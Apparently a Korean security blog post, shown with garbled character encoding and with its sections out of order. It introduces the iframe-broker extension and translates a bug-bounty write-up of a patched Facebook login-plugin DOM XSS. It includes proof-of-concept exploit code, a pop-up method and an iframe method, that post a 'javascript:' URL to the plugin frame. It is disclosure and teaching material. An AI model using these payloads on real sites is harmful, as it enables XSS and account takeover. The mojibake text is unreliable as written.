class="p">,</span><span class="dl">'</span><span class="s1">screenWidth</span><span class="dl">'</span><span class="p">:</span><span class="mi">1680</span><span class="p">}}})},</span><span class="dl">"</span><span class="s2">origin</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">ORIGIN</span><span class="dl">"</span><span class="p">};</span>
  <span class="nx">iframeEl</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="nx">message</span><span class="p">,</span> <span class="dl">'</span><span class="s1">*</span><span class="dl">'</span><span class="p">);</span>
<span class="p">};</span>
<span class="p">&lt;</span><span class="err">/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">id=</span><span class="s2">"fbframe"</span> <span class="na">src=</span><span class="s2">"https://www.facebook.com/v6.0/plugins/login_button.php?app_id=APP_ID&amp;auto_logout_link=false&amp;button_type=continue_with&amp;channel=REDIRECT_URL&amp;container_width=734&amp;locale=en_US&amp;sdk=joey&amp;size=large&amp;use_continue_as=true"</span> <span class="na">onload=</span><span class="s2">"fbFrameLoaded(this)"</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
</code></pre></div></div>

<h2 id="fix">Fix</h2>

<p>Facebookì€ <code class="highlighter-rouge">url</code> íŒŒë¼ë¯¸í„°ì— ì •ê·œì‹ ê²€ì‚¬ë¥¼ ì¶”ê°€í•˜ì—¬ domainê³¼ schemaê°€ ì¡´ì¬í•˜ëŠ”ì§€ í™•ì¸í•˜ëŠ” ë°©ë²•ìœ¼ë¡œ íŒ¨ì¹˜í–ˆìŠµë‹ˆë‹¤.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">d</span> <span class="o">=</span> <span class="nx">b</span><span class="p">(</span><span class="dl">"</span><span class="s2">isFacebookURI</span><span class="dl">"</span><span class="p">)(</span><span class="k">new</span> <span class="p">(</span><span class="nx">g</span> <span class="o">||</span> <span class="p">(</span><span class="nx">g</span> <span class="o">=</span> <span class="nx">b</span><span class="p">(</span><span class="dl">"</span><span class="s2">URI</span><span class="dl">"</span><span class="p">)))(</span><span class="nx">c</span><span class="p">.</span><span class="nx">call</span><span class="p">.</span><span class="nx">url</span><span class="p">)),</span>
<span class="nx">j</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">call</span><span class="p">;</span>
<span class="nx">d</span> <span class="o">||</span> <span class="p">(</span><span class="nx">j</span><span class="p">.</span><span class="nx">url</span> <span class="o">=</span> <span class="nx">b</span><span class="p">(</span><span class="dl">"</span><span class="s2">XOAuthErrorController</span><span class="dl">"</span><span class="p">).</span><span class="nx">getURIBuilder</span><span class="p">().</span><span class="nx">setEnum</span><span class="p">(</span><span class="dl">"</span><span class="s2">error_code</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">PLATFORM__INVALID_URL</span><span class="dl">"</span><span class="p">).</span><span class="nx">getURI</span><span class="p">().</span><span class="nx">toString</span><span class="p">())</span>
</code></pre></div></div>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p><a href="https://youtu.be/KAnuFy2F7QA">https://youtu.be/KAnuFy2F7QA</a></p>

<h2 id="impact">Impact</h2>

<p>ì˜ëª»ëœ post message ì„¤ì • ë•Œë¬¸ì— ëˆ„êµ°ê°€ëŠ” ê³µê²©ìì˜ ì›¹ì„¸ì´íŠ¸ì— ì ‘ì†í•˜ê³  í˜ì´ìŠ¤ë¶ìœ¼ë¡œ ë¡œê·¸ì¸í•˜ê¸° ë²„íŠ¼ì„ í´</p>

<p>ë¦­í•¨ìœ¼ë¡œì¨ <a href="http://facebook.com">facebook.com</a> ë„ë©”ì¸ì— XSSê°€ ë°œìƒí•˜ê³  <strong>í•œ ë²ˆì˜ í´ë¦­ ë§Œìœ¼ë¡œ ê³„ì •ì„ íƒˆì·¨</strong> í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>

   <ul>
  <li><a href="#iframe-broker">iframe broker</a></li>
  <li><a href="#story-of-20000-facebook-dom-xss">Story of <a href="https://vinothkumar.me/20000-facebook-dom-xss/">$20000 Facebook DOM XSS</a></a>
    <ul>
      <li><a href="#background">Background</a></li>
      <li><a href="#exploiting-the-iframe">Exploiting the Iframe</a>
        <ul>
          <li><a href="#1-pop-up-method">1. Pop-up Method</a></li>
          <li><a href="#2-iframe-method">2. Iframe Method</a></li>
        </ul>
      </li>
      <li><a href="#fix">Fix</a></li>
      <li><a href="#proof-of-concept">Proof of Concept</a></li>
      <li><a href="#impact">Impact</a></li>
    </ul>
  </li>
</ul>
   
   <p>ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ìµœì •ìˆ˜</p>

<p>ì´ ê¸€ì€ <a href="https://vinothkumar.me/">Vinoth Kumar</a>ê°€ ì§€ë‚œ 4ì›” Facebookì˜ DOM XSSë¥¼ ë°œê²¬í•˜ì—¬ ì œë³´í•˜ê³  2ë§Œ ë‹¬ëŸ¬ì˜ í¬ìƒê¸ˆì„ ë°›ì€ <a href="https://vinothkumar.me/20000-facebook-dom-xss/">ê²Œì‹œê¸€</a>ì„ ë²ˆì—­í•œ ë‚´ìš©ì´ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì¶”ê°€ë¡œ í•´ë‹¹ ì·¨ì•½ì ì„ ì°¾ê¸° ìœ„í•´ <a href="https://vinothkumar.me/">Vinoth Kumar</a>ê°€ ê°œë°œí•œ Iframeê³¼ Cross Window communications ë¡œê·¸ë¥¼ ì‰½ê²Œ í™•ì¸ í•  ìˆ˜ ìˆëŠ” í¬ë¡¬ ìµìŠ¤í…ì…˜ì„ ì‚¬ìš©í•˜ê³  ì–´ë–»ê²Œ ì ìš©í•  ìˆ˜ ìˆì„ì§€ ê³ ë¯¼í–ˆìŠµë‹ˆë‹¤.</p>

<hr />

<h1 id="iframe-broker">iframe broker</h1>

<hr />

<p>iframe brokerëŠ”  <a href="https://vinothkumar.me/">Vinoth Kumar</a>ê°€ Cross Window Communication ë¡œê·¸ë¥¼ ì‰½ê²Œ í™•ì¸í•˜ê¸° ìœ„í•´ì„œ ì‘ì„±í•œ Chrome Extension ì…ë‹ˆë‹¤.</p>

<p>í•´ë‹¹ ë„êµ¬ì˜ ê°„ë‹¨í•œ ì›ë¦¬ëŠ” messageë¥¼ í›„í‚¹í•˜ì—¬ ë³´ì—¬ì£¼ëŠ” ë°©ì‹ì…ë‹ˆë‹¤</p>

<p>JavascriptëŠ” ì•„ë˜ì™€ ê°™ì´ ê°„ë‹¨í•œ ìŠ¤í¬ë¦½íŠ¸ë¡œ í›„í‚¹í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">origin_parse</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">;</span>

<span class="nb">window</span><span class="p">.</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">arg</span><span class="p">){</span>
<span class="cm">/* Something Do It! */</span>
<span class="cm">/* ex) console.log(arg) */</span>
<span class="k">return</span> <span class="nx">origin_parse</span><span class="p">(</span><span class="nx">arg</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>iframe brokerì˜ ì‚¬ìš©ë²•ì€ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/vinothsparrow/iframe-broker
</code></pre></div></div>

<p>ìš°ì„  git clone ëª…ë ¹ì–´ë¥¼ í†µí•´ íŠ¹ì • í´ë”ì— iframe-brokerë¥¼ ë°›ì•„ì¤ë‹ˆë‹¤.</p>

<p><img src="/assets/bd2f2d57-db96-4a00-8b4b-95448a489543/9680797e-d1ef-4857-b3e2-0da9ee7ab169.png" alt="/assets/bd2f2d57-db96-4a00-8b4b-95448a489543/9680797e-d1ef-4857-b3e2-0da9ee7ab169.png" /></p>

<p>Chrome Extension ì¶”ê°€ë¥¼ ìœ„í•´ ê°œë°œì ëª¨ë“œ ì˜µì…˜ì„ í™œì„±í™” ì‹œì¼œì¤ë‹ˆë‹¤. í•´ë‹¹ ì˜µì…˜ì„ í™œì„±í™” ì‹œì¼œì£¼ê²Œë˜ë©´ <code class="highlighter-rouge">ì••ì¶•í•´ì œëœ í™•ì¥ í”„ë¡œê·¸ë¨ì„ ë¡œë“œí•©ë‹ˆë‹¤.</code> ë²„íŠ¼ì´ ìƒê¸°ë©° í´ë¦­ì„ í†µí•´ clone í•´ì¤€ iframe-broker í´ë”ë¥¼ ì„ íƒí•´ì¤ë‹ˆë‹¤.</p>

<p><img src="/assets/85b6ceaf-3565-47cd-b65f-12aa7cb8b535/5b9b6572-8ba4-4984-a5d4-a72b0f832085.png" alt="/assets/85b6ceaf-3565-47cd-b65f-12aa7cb8b535/5b9b6572-8ba4-4984-a5d4-a72b0f832085.png" /></p>

<p>Iframe Brokerê°€ ì •ìƒì ìœ¼ë¡œ ë¡œë“œëœ ê²ƒì„ í™•ì¸ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>

<p><img src="/assets/bd53c735-b1b8-40f8-a86c-bfd2d2a7abd7/a391c04c-77cb-4b68-aab7-690a51b4c54d.png" alt="/assets/bd53c735-b1b8-40f8-a86c-bfd2d2a7abd7/a391c04c-77cb-4b68-aab7-690a51b4c54d.png" /></p>

<p>ìœ„ì™€ ê°™ì´ Chrome Extensionì„ í†µí•´ Domainê°„ í†µì‹ í•˜ëŠ” ë©”ì„¸ì§€ë¥¼ ì‰½ê²Œ í™•ì¸ í•  ìˆ˜ ìˆìœ¼ë©° í´ë¼ì´ì–¸íŠ¸ ì‚¬ì´ë“œì˜ ì·¨ì•½ì ì„ ì°¾ëŠ”ë° í¸ë¦¬í•œ ë„êµ¬ë¼ëŠ” ìƒê°ì´ë“­ë‹ˆë‹¤. ì•„ë˜ëŠ” í•´ë‹¹ Chrome Extension ê°œë°œìê°€ ê°œë°œ í›„ Extensionì„ ì‚¬ìš©í•˜ë©´ì„œ ì§ì ‘ ì·¨ì•½ì ì„ ì°¾ì€ ë‚´ìš©ì„ ë²ˆì—­í–ˆìŠµë‹ˆë‹¤.</p>

<h1 id="story-of-20000-facebook-dom-xss">Story of <a href="https://vinothkumar.me/20000-facebook-dom-xss/">$20000 Facebook DOM XSS</a></h1>

<hr />

<blockquote>
  <p>window.postMessage() methodë¥¼ ì‚¬ìš©í•˜ë©´ ìƒì„± ëœ í˜ì´ì§€ì™€ íŒì—… ì‚¬ì´ ë˜ëŠ” í˜ì´ì§€ì™€ í˜ì´ì§€ì— í¬í•¨ëœ iframe ì‚¬ì´ì™€ ê°™ì€ Window ê°ì²´ ê°„ì˜ cross-origin í†µì‹ ì„ ì•ˆì „í•˜ê²Œ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. - <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage">Mozilla postMessage Documentation</a></p>
</blockquote>

<p>postMessage ë° ë„ë©”ì¸ ê°„ í†µì‹ ì— ëŒ€í•´ ë” ì•Œê³  ì‹¶ë‹¤ë©´ ì•„ë˜ ë¬¸ì„œë¥¼ ì½ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤.</p>

<ul>
  <li><a href="https://javascript.info/cross-window-communication">How cross window/frame communication happens in Javascript</a></li>
  <li><a href="https://labs.detectify.com/2016/12/08/the-pitfalls-of-postmessage/">https://labs.detectify.com/2016/12/08/the-pitfalls-of-postmessage/</a></li>
  <li><a href="https://ngailong.wordpress.com/2018/02/13/the-mystery-of-postmessage/">https://ngailong.wordpress.com/2018/02/13/the-mystery-of-postmessage/</a></li>
</ul>

<h2 id="background">Background</h2>

<blockquote>
  <p>postMessageë¥¼ í†µí•œ DOM XSSëŠ” ê³¼ì†Œ í‰ê°€ ëœ ì·¨ì•½ì ì´ë©° ë§ì€ ë²„ê·¸ë°”ìš´í‹° í—Œí„°ë“¤ì—ê²ŒëŠ” ëˆˆì— ë„ì§€ ì•ŠëŠ” ì·¨ì•½ì ì…ë‹ˆë‹¤.</p>
</blockquote>

<p>ìµœê·¼ì— open dashboards ë° credentials ì·¨ì•½ì ì„ ì°¾ëŠ” ëŒ€ì‹  í´ë¼ì´ì–¸íŠ¸ ìª½ ì·¨ì•½ì ì„ ì°¾ê¸° ì‹œì‘í–ˆìŠµë‹ˆë‹¤.</p>

<p>(<a href="https://hackerone.com/vinothkumar">HackerOneì— ë¦¬í¬íŠ¸ëœ ë³´ê³ ì„œ</a>ë¥¼ ë³¸ë‹¤ë©´ ëŒ€ë¶€ë¶„ ë‚˜ì˜ ë¦¬í¬íŠ¸ëŠ” open dashboard ë˜ëŠ” Github credential leak ì…ë‹ˆë‹¤.)</p>

<p>ì²˜ìŒì—ëŠ” XSSI, JSONP ë° postMessage ê´€ë ¨ ëœ ë³´ì•ˆ ë¬¸ì œë¥¼ ì°¾ê¸° ì‹œì‘í–ˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ XSSI ë° JSONP ì·¨ì•½ì ì€ ë§¤ìš° ë“œë¬¼ë©° <a href="https://blog.reconless.com/samesite-by-default/">SameSite ì¿ í‚¤</a>ê°€ ë„ì… ëœ ì´í›„ ì´ ì·¨ì•½ì ì€ ì‚¬ë¼ì§ˆ ê²ƒì…ë‹ˆë‹¤. ë”°ë¼ì„œ postMessage ì·¨ì•½ì ì„ ì‚´í´ ë³´ëŠ” ë° ì§‘ì¤‘í–ˆìŠµë‹ˆë‹¤. postMessage ì·¨ì•½ì ì€ ì£¼ë¡œ ë³´ì•ˆ ì—°êµ¬ì›ì´ ëŒ€ë¶€ë¶„ ë¬´ì‹œí•˜ì§€ë§Œ ë””ë²„ê¹…ì´ ì‰½ê³  ë°©í™”ë²½ì„ ìš°íšŒ í•  í•„ìš”ê°€ ì—†ìŠµë‹ˆë‹¤.</p>

<p>ë˜í•œ ë””ë²„ê¹…ì„ ë” ì‰½ê²Œí•˜ê¸° ìœ„í•´ í˜ì´ì§€ì—ì„œ ë°œìƒí•˜ëŠ” cross window communicationì˜ view/logë¥¼ ìœ„í•œ <a href="https://github.com/vinothsparrow/iframe-broker">Chrome extensionì„ ê°œë°œ</a> í–ˆìŠµë‹ˆë‹¤.</p>

<p>ì¼ë°˜ì ìœ¼ë¡œ ì›¹ ì‚¬ì´íŠ¸ëŠ” ìœ„ì ¯, í”ŒëŸ¬ê·¸ì¸ ë˜ëŠ” ì›¹ SDKì—ì„œ iframe í†µì‹ ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. ë”°ë¼ì„œ í˜ì´ìŠ¤ë¶ì˜ iframe ë³´ì•ˆ ë¬¸ì œë¥¼ ì°¾ìœ¼ë ¤ê³  ì‹œì‘í•˜ìë§ˆì <a href="https://developers.facebook.com/">https://developers.facebook.com</a>ìœ¼ë¡œ ì´ë™í•˜ì—¬ Facebookì˜ third-party í”ŒëŸ¬ê·¸ì¸ì„ ë³´ê¸° ì‹œì‘í–ˆìŠµë‹ˆë‹¤.</p>

<p>ê·¸ë¦¬ê³  cross-domain í†µì‹ ì„ ìœ„í•´ì„œ <code class="highlighter-rouge">Facebook Login SDK for JavaScript</code>ëŠ” <code class="highlighter-rouge">v6.0/plugins/login_button.php</code>ì—ì„œ proxy iframeì„ ë§Œë“¤ë©° proxy frameì—ì„œëŠ” <code class="highlighter-rouge">Continue with Facebook</code> ë²„íŠ¼ì„ ë Œë”ë§ í•´ì¤ë‹ˆë‹¤. ì—¬ê¸°ì„œ í¥ë¯¸ë¡œìš´ ì ì€ javascript SDKê°€ proxy frameì— ë²„íŠ¼ì˜ í´ë¦­ URLì´ í¬í•¨ ëœ ì´ˆê¸°í™” í˜ì´ë¡œë“œë¥¼ ì „ì†¡ í•œë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤.</p>

<p>ë¡œê·¸ì¸ SDKì˜ íë¦„ì€ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Third</span><span class="o">-</span><span class="nx">Party</span> <span class="nx">website</span> <span class="o">+</span> <span class="p">(</span><span class="nx">Facebook</span> <span class="nx">Login</span> <span class="nx">SDK</span> <span class="k">for</span> <span class="nx">JavaScript</span><span class="p">)</span>
</code></pre></div></div>

<p>â†“</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">iframe</span> <span class="nx">src</span><span class="o">=</span><span class="dl">'</span><span class="s1">https://www.facebook.com/v6.0/plugins/login_button.php?app_id=APP_ID&amp;button_type=continue_with&amp;channel=REDIRECT_URL&amp;sdk=joey</span><span class="dl">'</span><span class="o">&gt;</span>
<span class="p">&lt;</span><span class="err">/</span><span class="nt">iframe</span><span class="p">&gt;</span>
</code></pre></div></div>

<p>â†“</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Facebook Javascript SDKëŠ” ì´ˆê¸°í™” payloadë¥¼ iframe proxyì—ê²Œ ë³´ëƒ…ë‹ˆë‹¤.</span>
<span class="nx">iframe</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">({</span><span class="dl">"</span><span class="s2">xdArbiterHandleMessage</span><span class="dl">"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">method</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">loginButtonStateInit</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">params</span><span class="dl">"</span><span class="p">:</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="dl">'</span><span class="s1">call</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">id</span><span class="dl">'</span><span class="p">:</span><span class="dl">'</span><span class="s1">INT_ID</span><span class="dl">'</span><span class="p">,</span>
<span class="dl">'</span><span class="s1">url</span><span class="dl">'</span><span class="p">:</span><span class="dl">'</span><span class="s1">https://www.facebook.com/v7.0/dialog/oauth?app_id=APP_ID&amp;SOME_OTHER_PARAMS</span><span class="dl">'</span><span class="p">,</span>
<span class="dl">'</span><span class="s1">size</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">width</span><span class="dl">'</span><span class="p">:</span><span class="mi">10</span><span class="p">,</span><span class="dl">'</span><span class="s1">height</span><span class="dl">'</span><span class="p">:</span><span class="mi">10</span><span class="p">},</span><span class="dl">'</span><span class="s1">dims</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">screenX</span><span class="dl">'</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="dl">'</span><span class="s1">screenY</span><span class="dl">'</span><span class="p">:</span><span class="mi">23</span><span class="p">,</span><span class="dl">'</span><span class="s1">outerWidth</span><span class="dl">'</span><span class="p">:</span><span class="mi">1680</span><span class="p">,</span><span class="dl">'</span><span class="s1">outerHeight</span><span class="dl">'</span><span class="p">:</span><span class="mi">971</span><span class="dl">'</span><span class="s1">screenWidth</span><span class="dl">'</span><span class="p">:</span><span class="mi">1680</span><span class="p">}}})},</span><span class="dl">"</span><span class="s2">origin</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">APP_DOMAIN</span><span class="dl">"</span><span class="p">},</span> <span class="dl">'</span><span class="s1">*</span><span class="dl">'</span><span class="p">)</span>
</code></pre></div></div>

<p>â†“</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// ìœ ì €ê°€ Login with Facebook ë²„íŠ¼ì„ í´ë¦­í•˜ë©´ proxy iframeì—ì„œ íŠ¹ì • URLì„ open í•©ë‹ˆë‹¤.</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://www.facebook.com/v7.0/dialog/oauth?app_id=APP_ID</span><span class="dl">'</span><span class="p">)</span>
</code></pre></div></div>

<p>â†“</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// íŒì—… ìœˆë„ìš°ëŠ” accesstokenê³¼ signed-requestë¥¼ third-party websiteì—ê²Œ postMessageë¥¼ ì‚¬ìš©í•˜ì—¬ ë³´ëƒ…ë‹ˆë‹¤.</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">opener</span><span class="p">.</span><span class="nx">parent</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="nx">result</span><span class="p">,</span> <span class="nx">origin</span><span class="p">)</span>
</code></pre></div></div>

<p>í•´ë‹¹ ì´ˆê¸°í™” payloadë¥¼ ì£¼ì˜ ê¹Šê²Œ ì‚´í´ë³´ë©´ SDKê°€ Facebook í”ŒëŸ¬ê·¸ì¸ iframeìœ¼ë¡œ ì „ì†¡í•©ë‹ˆë‹¤. url íŒŒë¼ë¯¸í„°ëŠ” ië¼ëŠ” ë³€ìˆ˜ì— ì €ì¥ ë˜ë©° ë²„íŠ¼ì´ í´ë¦­ ë˜ì–´ ì´ë²¤íŠ¸ê°€ íŠ¸ë¦¬ê±° ë  ë•Œ ì•„ë˜ í•¨ìˆ˜ê°€ ì‹¤í–‰ë©ë‹ˆë‹¤.</p>

<p><img src="/assets/69ede5d3-8ba8-4af5-9ac8-fd925cbbe6d8/3dd7a08c-1d2a-4348-b669-0f7647a99b6b.png" alt="/assets/69ede5d3-8ba8-4af5-9ac8-fd925cbbe6d8/3dd7a08c-1d2a-4348-b669-0f7647a99b6b.png" /></p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">i</span><span class="p">.</span><span class="nx">url</span> <span class="o">=</span> <span class="nx">i</span><span class="p">.</span><span class="nx">url</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/cbt=</span><span class="se">\d</span><span class="sr">+/</span><span class="p">,</span> <span class="dl">"</span><span class="s2">cbt=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">a</span><span class="p">);</span>
<span class="nx">a</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">i</span><span class="p">.</span><span class="nx">url</span><span class="p">,</span> <span class="nx">i</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span> <span class="nx">b</span><span class="p">(</span><span class="dl">"</span><span class="s2">buildPopupFeatureString</span><span class="dl">"</span><span class="p">)(</span><span class="nx">i</span><span class="p">));</span>
</code></pre></div></div>

<p>ìœ„ Javascript ì½”ë“œë¥¼ ë³´ì•˜ì„ ë•Œ ë‚˜ëŠ” â€œë¬´ì–¸ê°€ ì™”êµ¬ë‚˜! ì·¨ì•½ì ì´ ë‚´ê²Œ ì™”êµ¬ë‚˜! ğŸ˜‰â€ë¥¼ ëŠê¼ˆìŠµë‹ˆë‹¤.</p>

<p>ì™œëƒí•˜ë©´ Javascript ì½”ë“œì—ëŠ” URL/Scheme ìœ íš¨ì„± ê²€ì‚¬ê°€ ì¡´ì¬í•˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì•„ë˜ì™€ ê°™ì´ DOM XSSë¥¼ í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.</p>

<p><code class="highlighter-rouge">window.open('javascript:alert(document.domain)')</code></p>

<p>ê·¸ë˜ì„œ ìš°ë¦¬ê°€ <code class="highlighter-rouge">url:'javascript:alert(document.domain)'</code>ì™€ ê°™ì€ í˜ì´ë¡œë“œë¥¼ ë³´ë‚´ëŠ” ê²½ìš° ë°›ëŠ” ì‚¬ëŒì€ iframeì´ <a href="https://www.facebook.com/v6.0/plugins/login_button.php"><code class="highlighter-rouge">https://www.facebook.com/v6.0/plugins/login_button.php</code></a>ë¥¼ ë°©ë¬¸í•˜ê³  ì‚¬ìš©ìê°€ <code class="highlighter-rouge">Continue With Facebook</code>ë²„íŠ¼ì„ í´ë¦­í•˜ê²Œ ë˜ë©´  <a href="http://facebook.com/">facebook.com</a> ë„ë©”ì¸ì—ì„œ <code class="highlighter-rouge">javascript:alert(document.domain)</code>ì™€ ê°™ì€ Javascriptê°€ ì‹¤í–‰ë©ë‹ˆë‹¤.</p>

<h2 id="exploiting-the-iframe">Exploiting the Iframe</h2>

<p>ìœ„ ë³´ì•ˆ ì´ìŠˆë¥¼ í†µí•´ ìµìŠ¤í”Œë¡œì‡ í•˜ëŠ” ë°©ë²•ì€ 2ê°€ì§€ê°€ ìˆìŠµë‹ˆë‹¤.</p>

<h3 id="1-pop-up-method">1. Pop-up Method</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>   
   <span class="kd">var</span> <span class="nx">opener</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://www.facebook.com/v6.0/plugins/login_button.php?app_id=APP_ID&amp;auto_logout_link=false&amp;button_type=continue_with&amp;channel=REDIRECT_URL&amp;container_width=734&amp;locale=en_US&amp;sdk=joey&amp;size=large&amp;use_continue_as=true</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">opener</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=500,height=1</span><span class="dl">"</span><span class="p">);</span>
   
   <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
        <span class="kd">var</span> <span class="nx">message</span> <span class="o">=</span> <span class="p">{</span><span class="dl">"</span><span class="s2">xdArbiterHandleMessage</span><span class="dl">"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">method</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">loginButtonStateInit</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">params</span><span class="dl">"</span><span class="p">:</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="dl">'</span><span class="s1">call</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">id</span><span class="dl">'</span><span class="p">:</span><span class="dl">'</span><span class="s1">123</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">url</span><span class="dl">'</span><span class="p">:</span><span class="dl">'</span><span class="s1">javascript:alert(document.domain);</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">size</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">width</span><span class="dl">'</span><span class="p">:</span><span class="mi">10</span><span class="p">,</span><span class="dl">'</span><span class="s1">height</span><span class="dl">'</span><span class="p">:</span><span class="mi">10</span><span class="p">},</span><span class="dl">'</span><span class="s1">dims</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">screenX</span><span class="dl">'</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="dl">'</span><span class="s1">screenY</span><span class="dl">'</span><span class="p">:</span><span class="mi">23</span><span class="p">,</span><span class="dl">'</span><span class="s1">outerWidth</span><span class="dl">'</span><span class="p">:</span><span class="mi">1680</span><span class="p">,</span><span class="dl">'</span><span class="s1">outerHeight</span><span class="dl">'</span><span class="p">:</span><span class="mi">971</span><span class="p">,</span><span class="dl">'</span><span class="s1">screenWidth</span><span class="dl">'</span><span class="p">:</span><span class="mi">1680</span><span class="p">}}})},</span><span class="dl">"</span><span class="s2">origin</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">ORIGIN</span><span class="dl">"</span><span class="p">};</span>
        <span class="nx">opener</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="nx">message</span><span class="p">,</span> <span class="dl">'</span><span class="s1">*</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">},</span><span class="dl">'</span><span class="s1">4000</span><span class="dl">'</span><span class="p">);</span>
<span class="p">&lt;</span><span class="err">/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre></div></div>

<h3 id="2-iframe-method">2. Iframe Method</h3>

<p><code class="highlighter-rouge">X-Frame-Options</code> ë˜ëŠ” CSP <code class="highlighter-rouge">frame-ancestors</code> í—¤ë”ê°€ ëˆ„ë½ ë˜ì—ˆìœ¼ë¯€ë¡œ ì´ í˜ì´ì§€ëŠ” ê³µê²©ìì˜ í˜ì´ì§€ì— ì‰½ê²Œ í¬í•¨ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
<span class="kd">function</span> <span class="nx">fbFrameLoaded</span><span class="p">()</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">iframeEl</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">fbframe</span><span class="dl">'</span><span class="p">);</span>
